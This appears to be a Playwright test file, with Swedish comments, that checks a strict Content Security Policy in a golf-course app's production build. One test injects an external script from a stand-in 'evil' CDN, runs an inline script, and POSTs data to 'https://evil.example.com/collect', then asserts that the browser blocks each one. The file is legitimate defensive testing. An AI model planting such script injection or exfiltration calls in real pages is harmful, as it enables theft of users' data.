import { BrowserContext, expect, Page, test } from '@playwright/test';
import {
  configure,
  ESRI_TILES,
  RAW_URL,
  stubGitDataApi,
  TEST_TOKEN,
  TILE_PNG,
  TWO_COURSES,
} from './support/github-api-stub';

// Körs i projektet 'offline' mot produktionsbygget — bara där finns CSP-metataggen och service workern.

interface Violation {
  readonly directive: string;
  readonly blockedURI: string;
}

declare global {
  interface Window {
    cspViolations: Violation[];
  }
}

/** Samlar `securitypolicyviolation`-händelser och konsolfel om CSP från första början. */
async function recordCspViolations(page: Page): Promise<string[]> {
  await page.addInitScript(() => {
    window.cspViolations = [];
    document.addEventListener('securitypolicyviolation', (e) =>
      window.cspViolations.push({ directive: e.effectiveDirective, blockedURI: e.blockedURI }),
    );
  });
  const consoleErrors: string[] = [];
  page.on('console', (msg) => {
    if (msg.type() === 'error' && /Content Security Policy/i.test(msg.text())) {
      consoleErrors.push(msg.text());
    }
  });
  return consoleErrors;
}

const violations = (page: Page) => page.evaluate(() => window.cspViolations);

// context.route fångar även service workerns egna nätverksanrop (Chromium).
async function stubNetwork(context: BrowserContext) {
  await context.route(RAW_URL, (route) =>
    route.fulfill({ status: 200, contentType: 'text/plain', body: JSON.stringify(TWO_COURSES) }),
  );
  let tiles = 0;
  await context.route(ESRI_TILES, (route) => {
    tiles += 1;
    return route.fulfill({ status: 200, contentType: 'image/png', body: TILE_PNG });
  });
  return () => tiles;
}

async function firstVisitWithServiceWorker(page: Page) {
  await page.goto('./');
  await configure(page, TEST_TOKEN);
  await page.evaluate(() => navigator.serviceWorker.ready);
  await page.reload();
  await expect.poll(() => page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true);
}

test.describe('Ticket 07: strikt CSP i produktionsbygget', () => {
  test('spara-flödet, karta, service worker och Spelläget fungerar utan CSP-överträdelser', async ({
    page,
    context,
  }) => {
    const consoleErrors = await recordCspViolations(page);
    const tileRequests = await stubNetwork(context);
    const gitRequests = await stubGitDataApi(context);
    await firstVisitWithServiceWorker(page);
    await expect(page.locator('meta[http-equiv="Content-Security-Policy"]')).toHaveAttribute(
      'content',
      /script-src 'self';/,
    );

    await page.getByRole('link', { name: 'Redigeringsläge' }).click();
    await page.getByRole('button', { name: 'Redigera Ullna GK' }).click();
    await expect(page.getByRole('region', { name: 'Karta' })).toContainText('Esri');
    await expect(page.locator('.leaflet-marker-icon')).toHaveCount(9);
    await expect.poll(tileRequests).toBeGreaterThan(0);

    await page.getByRole('button', { name: 'Ta bort Lida GK' }).click();
    const save = page.getByRole('region', { name: 'Spara' });
    await save.getByRole('button', { name: 'Spara banor' }).click();
    await expect(save.getByRole('status')).toHaveText('Banorna är sparade i data-repot.');
    expect(gitRequests.map((r) => r.method)).toEqual(['POST', 'POST', 'POST', 'PATCH']);

    await page.getByRole('link', { name: 'Tillbaka till start' }).click();
    await page.getByRole('link', { name: 'Spelläge' }).click();
    await expect(page.getByRole('list', { name: 'Banor' }).getByRole('listitem')).toHaveText([/Ullna GK/]);
    await page.getByRole('link', { name: /Ullna GK/ }).click();
    await expect(page.getByRole('heading', { name: 'Hål 1' })).toBeVisible();

    expect(await violations(page)).toEqual([]);
    expect(consoleErrors).toEqual([]);
  });

  test('skript utifrån, inline-skript och anrop till ej listade origins blockeras', async ({ page, context }) => {
    await recordCspViolations(page);
    await stubNetwork(context);
    await page.goto('./');

    const outcome = await page.evaluate(async () => {
      const external = document.createElement('script');
      external.src = 'https://cdn.example.com/evil.js';
      document.head.append(external);

      const inline = document.createElement('script');
      inline.textContent = 'window.inlineRan = true;';
      document.head.append(inline);

      const fetched = await fetch('https://evil.example.com/collect', { method: 'POST', body: 'x' }).then(
        () => 'sent',
        () => 'blocked',
      );
      await new Promise((resolve) => setTimeout(resolve, 100));
      return { fetched, inlineRan: 'inlineRan' in window };
    });

    expect(outcome).toEqual({ fetched: 'blocked', inlineRan: false });
    await expect
      .poll(async () => (await violations(page)).map((v) => `${v.directive} ${v.blockedURI}`).sort())
      .toEqual([
        'connect-src https://evil.example.com/collect',
        'script-src-elem https://cdn.example.com/evil.js',
        'script-src-elem inline',
      ]);
  });
});
